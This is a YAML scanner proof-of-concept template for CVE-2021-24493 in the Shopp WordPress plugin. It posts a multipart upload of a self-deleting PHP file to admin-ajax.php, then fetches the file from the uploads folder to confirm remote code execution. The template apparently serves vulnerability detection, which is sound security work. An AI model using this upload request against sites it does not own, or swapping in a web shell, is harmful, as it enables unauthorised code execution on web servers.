name: yaml-poc-ingenesis-shopp-logical-CVE-2021-24493
binding: 954f97c1-35d6-4fce-bafd-a3d4aa105fa2
detail:
    author: jiapeng.han
    links:
        - https://wpscan.com/vulnerability/dcc7be04-550b-427a-a14f-a2365d96a00e
    vulnerability:
        id: 679413be-064a-49d4-8952-c6f65ed89db4
        level: critical
    warning: File Upload
transport: http
set:
    r1: randomLowercase(20)
    r2: randomLowercase(20)
    rboundary: randomLowercase(28)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /wp-admin/admin-ajax.php?action=shopp_upload_file
            headers:
                Content-Type: multipart/form-data; boundary=---------------------------{{rboundary}}
            body: "-----------------------------{{rboundary}}\r\nContent-Disposition: form-data; name=\"dzchunkindex\"\r\n\r\n0\r\n-----------------------------{{rboundary}}\r\nContent-Disposition: form-data; name=\"dztotalchunkcount\"\r\n\r\n1\r\n-----------------------------{{rboundary}}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{{r1}}.php\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php echo \"{{r2}}\"; unlink(__FILE__); ?>\r\n\r\n-----------------------------{{rboundary}}--\r\n"
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains(r1 + '.php"')
    r1:
        request:
            cache: true
            method: GET
            path: /wp-content/uploads/{{r1}}.php
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains(r2)
expression: r0() && r1()
